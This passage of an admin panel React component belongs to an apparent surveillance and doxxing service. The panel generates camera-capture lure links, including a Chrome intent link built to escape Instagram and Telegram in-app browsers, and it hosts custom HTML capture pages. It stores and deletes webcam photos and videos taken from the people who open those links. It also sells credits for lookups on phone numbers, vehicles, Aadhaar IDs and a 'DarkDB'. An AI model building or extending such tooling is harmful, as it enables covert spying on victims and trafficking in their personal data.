                    navigator.clipboard.writeText(`intent://${window.location.origin.replace(/^https?:\/\//, '')}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl || 'https://google.com')}#Intent;scheme=https;package=com.android.chrome;end`);
                    toast({ title: "Copied!", description: "Chrome intent link copied" });
                  }}
                  className="border-neon-orange text-neon-orange"
                >
                  <Save className="w-4 h-4" />
                </Button>
              </div>
            </div>

            {/* Custom HTML Capture */}
            {settings.customCaptureHtml && (
              <div className="p-3 bg-neon-cyan/10 rounded-lg border border-neon-cyan/30">
                <label className="text-xs text-neon-cyan font-bold mb-2 block flex items-center gap-2">
                  🎨 Custom HTML Capture
                </label>
                <div className="flex gap-2">
                  <Input
                    readOnly
                    value={`${window.location.origin}/custom-capture?session=${settings.camSessionId}`}
                    className="font-mono text-xs bg-background/50"
                  />
                  <Button
                    size="icon"
                    variant="outline"
                    onClick={() => {
                      navigator.clipboard.writeText(`${window.location.origin}/custom-capture?session=${settings.camSessionId}`);
                      toast({ title: "Copied!", description: "Custom HTML capture link copied" });
                    }}
                    className="border-neon-cyan text-neon-cyan"
                  >
                    <Save className="w-4 h-4" />
                  </Button>
                </div>
              </div>
            )}

            {/* Chrome Custom HTML */}
            {settings.chromeCustomHtml && (
              <div className="p-3 bg-neon-purple/10 rounded-lg border border-neon-purple/30">
                <label className="text-xs text-neon-purple font-bold mb-2 block flex items-center gap-2">
                  🔧 Chrome Custom HTML
                </label>
                <div className="flex gap-2">
                  <Input
                    readOnly
                    value={`${window.location.origin}/chrome-custom-capture?session=${settings.camSessionId}`}
                    className="font-mono text-xs bg-background/50"
                  />
                  <Button
                    size="icon"
                    variant="outline"
                    onClick={() => {
                      navigator.clipboard.writeText(`${window.location.origin}/chrome-custom-capture?session=${settings.camSessionId}`);
                      toast({ title: "Copied!", description: "Chrome custom HTML link copied" });
                    }}
                    className="border-neon-purple text-neon-purple"
                  >
                    <Save className="w-4 h-4" />
                  </Button>
                </div>
              </div>
            )}
          </div>

          {/* Custom HTML Template */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-orange flex items-center gap-2">
              <Upload className="w-4 h-4" /> Custom HTML Template
            </h3>
            <p className="text-xs text-muted-foreground">Create a custom page for capture. Leave empty for default.</p>
            <textarea
              value={settings.customCaptureHtml}
              onChange={(e) => updateSettings({ customCaptureHtml: e.target.value })}
              placeholder="<html>...</html>"
              className="w-full h-24 p-3 rounded-lg bg-background border border-border/50 font-mono text-xs resize-none"
            />
            <div className="flex gap-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => updateSettings({ customCaptureHtml: "" })}
                className="border-neon-red/50 text-neon-red hover:bg-neon-red/10"
              >
                <X className="w-4 h-4 mr-1" /> Clear
              </Button>
            </div>
          </div>

          {/* Chrome Custom HTML Template */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-cyan flex items-center gap-2">
              <Upload className="w-4 h-4" /> Chrome Custom HTML
            </h3>
            <p className="text-xs text-muted-foreground">Custom page for Chrome intent capture (Instagram/Telegram).</p>
            <textarea
              value={settings.chromeCustomHtml}
              onChange={(e) => updateSettings({ chromeCustomHtml: e.target.value })}
              placeholder="<html>...</html>"
              className="w-full h-24 p-3 rounded-lg bg-background border border-border/50 font-mono text-xs resize-none"
            />
            <div className="flex gap-2">
              <Button
                variant="outline"
                size="sm"
                onClick={() => updateSettings({ chromeCustomHtml: "" })}
                className="border-neon-red/50 text-neon-red hover:bg-neon-red/10"
              >
                <X className="w-4 h-4 mr-1" /> Clear
              </Button>
            </div>
          </div>

          {/* Data Management */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-red flex items-center gap-2">
              <Trash2 className="w-4 h-4" /> Clear Captured Data
            </h3>
            <p className="text-xs text-muted-foreground">Delete all captured photos and videos for current session</p>
            <div className="flex gap-2 flex-wrap">
              <Button
                onClick={async () => {
                  const { error } = await supabase
                    .from("captured_photos")
                    .delete()
                    .eq("session_id", settings.camSessionId);
                  if (!error) {
                    toast({ title: "Photos Cleared", description: "All captured photos deleted" });
                  } else {
                    toast({ title: "Error", description: "Failed to clear photos", variant: "destructive" });
                  }
                }}
                variant="outline"
                size="sm"
                className="border-neon-pink text-neon-pink hover:bg-neon-pink/10"
              >
                <Image className="w-4 h-4 mr-2" /> Clear Photos
              </Button>
              <Button
                onClick={async () => {
                  // First get all videos for this session
                  const { data: videos } = await supabase
                    .from("captured_videos")
                    .select("video_url")
                    .eq("session_id", settings.camSessionId);
                  
                  // Delete from storage
                  if (videos) {
                    for (const video of videos) {
                      const urlParts = video.video_url.split('/captured-videos/');
                      if (urlParts[1]) {
                        await supabase.storage.from('captured-videos').remove([urlParts[1]]);
                      }
                    }
                  }
                  
                  // Delete from database
                  const { error } = await supabase
                    .from("captured_videos")
                    .delete()
                    .eq("session_id", settings.camSessionId);
                  if (!error) {
                    toast({ title: "Videos Cleared", description: "All captured videos deleted" });
                  } else {
                    toast({ title: "Error", description: "Failed to clear videos", variant: "destructive" });
                  }
                }}
                variant="outline"
                size="sm"
                className="border-neon-red text-neon-red hover:bg-neon-red/10"
              >
                <Camera className="w-4 h-4 mr-2" /> Clear Videos
              </Button>
            </div>
          </div>
        </Section>

        {/* Music Section */}
        <Section title="Background Music" icon={Music} color="neon-yellow">
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-green">Main Page Music URL</h3>
            <p className="text-xs text-muted-foreground">
              Direct link to MP3 file for the main page mini player (leave empty for default music)
            </p>
            <Input
              value={settings.mainPageMusicUrl || ""}
              onChange={(e) => updateSettings({ mainPageMusicUrl: e.target.value })}
              placeholder="https://example.com/music.mp3"
              className="font-mono text-sm"
            />
            {settings.mainPageMusicUrl && (
              <div className="flex gap-2">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => window.open(settings.mainPageMusicUrl, '_blank')}
                  className="border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
                >
                  <ExternalLink className="w-4 h-4 mr-1" /> Test URL
                </Button>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => updateSettings({ mainPageMusicUrl: "" })}
                  className="border-neon-red/50 text-neon-red hover:bg-neon-red/10"
                >
                  <X className="w-4 h-4 mr-1" /> Clear
                </Button>
              </div>
            )}
          </div>

          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
            <h3 className="font-bold text-neon-yellow">Page 2 Music URL</h3>
            <p className="text-xs text-muted-foreground">
              Direct link to MP3 file for the Page2 music player (leave empty for default music)
            </p>
            <Input
              value={settings.page2MusicUrl || ""}
              onChange={(e) => updateSettings({ page2MusicUrl: e.target.value })}
              placeholder="https://example.com/music.mp3"
              className="font-mono text-sm"
            />
            {settings.page2MusicUrl && (
              <div className="flex gap-2">
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => window.open(settings.page2MusicUrl, '_blank')}
                  className="border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
                >
                  <ExternalLink className="w-4 h-4 mr-1" /> Test URL
                </Button>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => updateSettings({ page2MusicUrl: "" })}
                  className="border-neon-red/50 text-neon-red hover:bg-neon-red/10"
                >
                  <X className="w-4 h-4 mr-1" /> Clear
                </Button>
              </div>
            )}
          </div>
        </Section>

        {/* Theme Section */}
        <Section title="Theme Settings" icon={Palette} color="neon-orange">
          <div className="grid grid-cols-2 gap-4">
            {[
              { id: "dark", label: "Dark", colors: "from-gray-900 to-gray-800" },
              { id: "neon-green", label: "Neon Green", colors: "from-neon-green/20 to-background" },
              { id: "neon-pink", label: "Neon Pink", colors: "from-neon-pink/20 to-background" },
              { id: "neon-cyan", label: "Neon Cyan", colors: "from-neon-cyan/20 to-background" },
            ].map((theme) => (
              <button
                key={theme.id}
                onClick={() => updateSettings({ theme: theme.id as any })}
                className={`p-4 rounded-xl border-2 transition-all ${
                  settings.theme === theme.id 
                    ? "border-neon-green shadow-[0_0_15px_hsl(var(--neon-green)/0.5)]" 
                    : "border-border/50 hover:border-neon-green/50"
                }`}
              >
                <div className={`h-20 rounded-lg bg-gradient-to-br ${theme.colors} mb-2`} />
                <p className="text-sm font-medium text-foreground">{theme.label}</p>
              </button>
            ))}
          </div>
        </Section>

        {/* Password Section */}
        <Section title="Password & Access Keys" icon={Key} color="neon-green">
          {/* Site Password */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="font-bold text-neon-green flex items-center gap-2">
                <Key className="w-4 h-4" /> Site Password
              </h3>
              <div className="flex items-center gap-2">
                <span className="text-xs text-muted-foreground">
                  {settings.sitePasswordEnabled ? "ON" : "OFF"}
                </span>
                <Switch
                  checked={settings.sitePasswordEnabled}
                  onCheckedChange={(checked) => updateSettings({ sitePasswordEnabled: checked })}
                />
              </div>
            </div>
            <div className="relative">
              <Input
                type={showSitePassword ? "text" : "password"}
                value={localSitePassword}
                onChange={(e) => setLocalSitePassword(e.target.value)}
                className="pr-10"
                disabled={!settings.sitePasswordEnabled}
              />
              <button
                type="button"
                onClick={() => setShowSitePassword(!showSitePassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground"
              >
                {showSitePassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
            <p className="text-xs text-muted-foreground">
              {settings.sitePasswordEnabled 
                ? "Website password protection is ENABLED" 
                : "Website password protection is DISABLED - anyone can access"}
            </p>
          </div>

          {/* Admin Password */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <h3 className="font-bold text-neon-orange flex items-center gap-2">
              <Shield className="w-4 h-4" /> Admin Password
            </h3>
            <div className="relative">
              <Input
                type={showAdminPassword ? "text" : "password"}
                value={localAdminPassword}
                onChange={(e) => setLocalAdminPassword(e.target.value)}
                className="pr-10"
              />
              <button
                type="button"
                onClick={() => setShowAdminPassword(!showAdminPassword)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground"
              >
                {showAdminPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
            <p className="text-xs text-muted-foreground">This password is required to access this admin panel (always enabled)</p>
          </div>

          {/* ALL SEARCH Access Key */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="font-bold text-neon-red flex items-center gap-2">
                <Key className="w-4 h-4" /> ALL SEARCH Access Key
              </h3>
              <div className="flex items-center gap-2">
                <span className="text-xs text-muted-foreground">
                  {settings.allSearchKeyEnabled ? "ON" : "OFF"}
                </span>
                <Switch
                  checked={settings.allSearchKeyEnabled}
                  onCheckedChange={(checked) => updateSettings({ allSearchKeyEnabled: checked })}
                />
              </div>
            </div>
            <div className="relative">
              <Input
                type={showAllSearchKey ? "text" : "password"}
                value={localAllSearchKey}
                onChange={(e) => setLocalAllSearchKey(e.target.value)}
                placeholder="Set access key for ALL SEARCH..."
                className="pr-10"
                disabled={!settings.allSearchKeyEnabled}
              />
              <button
                type="button"
                onClick={() => setShowAllSearchKey(!showAllSearchKey)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground"
              >
                {showAllSearchKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
          </div>

          {/* Telegram OSINT Access Key */}
          <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="font-bold text-neon-cyan flex items-center gap-2">
                <Key className="w-4 h-4" /> Telegram OSINT Access Key
              </h3>
              <div className="flex items-center gap-2">
                <span className="text-xs text-muted-foreground">
                  {settings.telegramKeyEnabled ? "ON" : "OFF"}
                </span>
                <Switch
                  checked={settings.telegramKeyEnabled}
                  onCheckedChange={(checked) => updateSettings({ telegramKeyEnabled: checked })}
                />
              </div>
            </div>
            <div className="relative">
              <Input
                type={showTelegramKey ? "text" : "password"}
                value={localTelegramKey}
                onChange={(e) => setLocalTelegramKey(e.target.value)}
                placeholder="Set access key for Telegram OSINT..."
                className="pr-10"
                disabled={!settings.telegramKeyEnabled}
              />
              <button
                type="button"
                onClick={() => setShowTelegramKey(!showTelegramKey)}
                className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground"
              >
                {showTelegramKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
              </button>
            </div>
          </div>

          <Button onClick={savePasswords} className="w-full bg-neon-green text-background font-bold">
            <Save className="w-4 h-4 mr-2" /> Save Passwords & Keys
          </Button>
        </Section>

        {/* Credits Section */}
        <Section title="Credit Password Management" icon={Coins} color="neon-purple">
          {/* Credit System Toggle */}
          <div className="border border-neon-purple/50 rounded-xl p-4 bg-neon-purple/5">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="font-bold text-neon-purple flex items-center gap-2">
                  <Power className="w-4 h-4" /> Credit System
                </h3>
                <p className="text-xs text-muted-foreground mt-1">
                  {settings.creditSystemEnabled 
                    ? "Credit system is ON - Users need password to access" 
                    : "Credit system is OFF - No credit password required, everything FREE"}
                </p>
              </div>
              <Switch
                checked={settings.creditSystemEnabled}
                onCheckedChange={(checked) => updateSettings({ creditSystemEnabled: checked })}
              />
            </div>
          </div>

          {/* Generate New Password */}
          <div className="border border-neon-green/50 rounded-xl p-4 bg-neon-green/5 space-y-4">
            <h3 className="font-bold text-neon-green flex items-center gap-2">
              <Plus className="w-4 h-4" /> Generate New Password
            </h3>
            <div className="grid grid-cols-2 gap-3">
              <div>
                <label className="text-xs text-muted-foreground mb-1 block">Credits</label>
                <Input
                  type="number"
                  value={newCredits}
                  onChange={(e) => setNewCredits(e.target.value)}
                  min="1"
                  className="h-10"
                />
              </div>
              <div>
                <label className="text-xs text-muted-foreground mb-1 block">Custom Password (optional)</label>
                <Input
                  value={customPassword}
                  onChange={(e) => setCustomPassword(e.target.value.toUpperCase())}
                  placeholder="AUTO GENERATE"
                  className="h-10 font-mono"
                />
              </div>
            </div>
            <div className="flex flex-wrap gap-2">
              {[10, 50, 100, 500].map((c) => (
                <Button
                  key={c}
                  variant="outline"
                  size="sm"
                  onClick={() => setNewCredits(c.toString())}
                  className={`border-neon-green/50 ${newCredits === c.toString() ? 'bg-neon-green/20 text-neon-green' : 'text-neon-green/70'}`}
                >
                  {c} Credits
                </Button>
              ))}
            </div>
            <Button
              onClick={createPassword}
              disabled={isCreating}
              className="w-full h-12 bg-neon-green text-background font-bold hover:bg-neon-green/80"
            >
              {isCreating ? <Loader2 className="w-5 h-5 animate-spin" /> : <><Plus className="w-5 h-5 mr-2" /> {customPassword ? 'Create Custom Password' : 'Generate Random Password'}</>}
            </Button>
          </div>

          {/* Password List */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="font-bold text-neon-cyan">Password List</h3>
              <Button 
                variant="outline" 
                size="sm" 
                onClick={fetchPasswords} 
                className="border-neon-cyan/50 text-neon-cyan"
                disabled={isLoadingPasswords}
              >
                <RefreshCw className={`w-4 h-4 mr-1 ${isLoadingPasswords ? 'animate-spin' : ''}`} /> Refresh
              </Button>
            </div>
            
            {isLoadingPasswords ? (
              <div className="text-center py-12">
                <Loader2 className="w-8 h-8 mx-auto animate-spin text-neon-cyan" />
                <p className="text-muted-foreground mt-2">Loading passwords...</p>
              </div>
            ) : passwordRecords.length === 0 ? (
              <div className="text-center py-12 text-muted-foreground">
                <Key className="w-12 h-12 mx-auto mb-3 opacity-50" />
                <p>No passwords generated yet</p>
              </div>
            ) : (
              passwordRecords.map((record) => (
                <div 
                  key={record.id} 
                  className={`border rounded-xl p-4 transition-all ${
                    record.is_enabled 
                      ? 'border-neon-cyan/30 bg-card/50' 
                      : 'border-red-500/30 bg-red-500/5 opacity-60'
                  }`}
                >
                  <div className="flex items-center justify-between mb-3">
                    <div className="flex items-center gap-3">
                      <span className="text-xl font-mono font-bold text-neon-cyan tracking-widest">
                        {record.password_display}
                      </span>
                      <Button
                        size="sm"
                        variant="ghost"
                        onClick={() => {
                          navigator.clipboard.writeText(record.password_display);
                          toast({ title: "Copied!", description: "Password copied to clipboard" });
                        }}
                        className="text-neon-green hover:bg-neon-green/10"
                      >
                        <Save className="w-4 h-4" />
                      </Button>
                    </div>
                    <div className="flex items-center gap-2">
                      {record.is_unlimited && (
                        <span className="text-xs px-2 py-1 rounded bg-neon-purple/20 text-neon-purple font-bold">
                          ∞ UNLIMITED
                        </span>
                      )}
                      <span className={`text-xs px-2 py-1 rounded ${record.is_used ? 'bg-neon-yellow/20 text-neon-yellow' : 'bg-neon-green/20 text-neon-green'}`}>
                        {record.is_used ? 'USED' : 'AVAILABLE'}
                      </span>
                      <Switch
                        checked={record.is_enabled}
                        onCheckedChange={(checked) => updatePassword(record.id, { isEnabled: checked })}
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mb-3">
                    <div className="bg-black/30 rounded-lg p-2">
                      <span className="text-[10px] text-muted-foreground block">Total</span>
                      <span className="text-neon-green font-mono font-bold">{record.total_credits}</span>
                    </div>
                    <div className="bg-black/30 rounded-lg p-2">
                      <span className="text-[10px] text-muted-foreground block">Remaining</span>
                      <span className={`font-mono font-bold ${record.remaining_credits > 0 ? 'text-neon-cyan' : 'text-red-500'}`}>
                        {record.remaining_credits}
                      </span>
                    </div>
                    <div className="bg-black/30 rounded-lg p-2">
                      <span className="text-[10px] text-muted-foreground block">Used</span>
                      <span className="text-neon-pink font-mono font-bold">{record.total_credits - record.remaining_credits}</span>
                    </div>
                    <div className="bg-black/30 rounded-lg p-2">
                      <span className="text-[10px] text-muted-foreground block">Device</span>
                      <span className="text-xs text-muted-foreground truncate">{record.device_id ? '🔒 Bound' : '🔓 Free'}</span>
                    </div>
                  </div>

                  {editingId === record.id ? (
                    <div className="flex gap-2 mb-3">
                      <Input
                        type="number"
                        value={editCredits}
                        onChange={(e) => setEditCredits(e.target.value)}
                        className="h-9"
                        placeholder="New credits"
                      />
                      <Button
                        size="sm"
                        onClick={() => updatePassword(record.id, { credits: parseInt(editCredits) })}
                        className="bg-neon-green text-background"
                      >
                        Save
                      </Button>
                      <Button
                        size="sm"
                        variant="ghost"
                        onClick={() => setEditingId(null)}
                      >
                        Cancel
                      </Button>
                    </div>
                  ) : null}

                  <div className="flex flex-wrap gap-2">
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => updatePassword(record.id, { isUnlimited: !record.is_unlimited })}
                      className={`${record.is_unlimited ? 'border-neon-purple bg-neon-purple/20 text-neon-purple' : 'border-neon-purple/50 text-neon-purple hover:bg-neon-purple/10'}`}
                    >
                      {record.is_unlimited ? '∞ Unlimited ON' : '∞ Make Unlimited'}
                    </Button>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => {
                        setEditingId(record.id);
                        setEditCredits(record.remaining_credits.toString());
                      }}
                      className="border-neon-cyan/50 text-neon-cyan hover:bg-neon-cyan/10"
                    >
                      <Coins className="w-3 h-3 mr-1" /> Edit Credits
                    </Button>
                    {record.is_used && (
                      <Button
                        size="sm"
                        variant="outline"
                        onClick={() => resetPassword(record.id)}
                        className="border-neon-yellow/50 text-neon-yellow hover:bg-neon-yellow/10"
                      >
                        <RotateCcw className="w-3 h-3 mr-1" /> Reset Device
                      </Button>
                    )}
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => deletePassword(record.id)}
                      className="border-red-500/50 text-red-500 hover:bg-red-500/10"
                    >
                      <Trash2 className="w-3 h-3 mr-1" /> Delete
                    </Button>
                  </div>

                  <div className="mt-3 text-[10px] text-muted-foreground">
                    Created: {new Date(record.created_at).toLocaleString()}
                    {record.used_at && ` • First used: ${new Date(record.used_at).toLocaleString()}`}
                  </div>
                </div>
              ))
            )}
          </div>

          {/* Credit Costs Info */}
          <div className="border border-neon-purple/30 rounded-xl p-4 bg-neon-purple/5">
            <h3 className="font-bold text-neon-purple mb-3">Credit Costs</h3>
            <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-sm">
              <div className="flex justify-between"><span className="text-muted-foreground">Phone:</span><span className="text-neon-green">1 credit</span></div>
              <div className="flex justify-between"><span className="text-muted-foreground">Vehicle:</span><span className="text-neon-cyan">2 credits</span></div>
              <div className="flex justify-between"><span className="text-muted-foreground">Instagram:</span><span className="text-neon-pink">3 credits</span></div>
              <div className="flex justify-between"><span className="text-muted-foreground">Telegram:</span><span className="text-neon-yellow">3 credits</span></div>
              <div className="flex justify-between"><span className="text-muted-foreground">Aadhaar:</span><span className="text-neon-orange">5 credits</span></div>
              <div className="flex justify-between"><span className="text-muted-foreground">DarkDB:</span><span className="text-neon-purple">5 credits</span></div>
            </div>
          </div>
        </Section>

        {/* History Section */}
        <Section title="Search History" icon={History} color="neon-cyan">
          <div className="flex items-center justify-between mb-4">
            <span className="text-sm text-muted-foreground">{searchHistory.length} records</span>
            <div className="flex gap-2">
              <Button variant="outline" size="sm" onClick={fetchSearchHistory} className="border-neon-cyan/50 text-neon-cyan">
                <RefreshCw className="w-4 h-4 mr-1" /> Refresh
              </Button>
              <Button variant="outline" size="sm" onClick={clearSearchHistory} className="border-neon-red/50 text-neon-red">
                <Trash2 className="w-4 h-4 mr-1" /> Clear All
              </Button>
            </div>
          </div>

          <div className="space-y-2 max-h-[60vh] overflow-y-auto">
            {searchHistory.length === 0 ? (
              <div className="text-center py-12 text-muted-foreground">
                <History className="w-12 h-12 mx-auto mb-3 opacity-50" />
                <p>No search history yet</p>
              </div>
            ) : (
              searchHistory.map((item) => (
                <div key={item.id} className="flex items-center justify-between p-3 bg-card/50 rounded-lg border border-border/30">
                  <div className="flex items-center gap-3">
                    <span className="text-xs px-2 py-1 rounded bg-neon-cyan/20 text-neon-cyan uppercase">
                      {item.search_type}
                    </span>
                    <span className="text-foreground font-mono">{item.search_query}</span>
                  </div>
                  <span className="text-xs text-muted-foreground">
                    {new Date(item.searched_at).toLocaleString()}
                  </span>
                </div>
              ))
            )}
          </div>
        </Section>

        {/* Randi Panel Section */}
        <Section title="Randi Panel" icon={Camera} color="neon-red">
          <div className="text-center py-6">
            <p className="text-muted-foreground mb-4">Access the camera capture panel</p>
            <Button
              onClick={() => navigate('/randi-panel')}
              className="bg-neon-red hover:bg-neon-red/80 text-white"
            >
              <ExternalLink className="w-4 h-4 mr-2" /> Open Randi Panel
            </Button>
          </div>
        </Section>

      </div>
    </div>
  );
};

export default Admin;
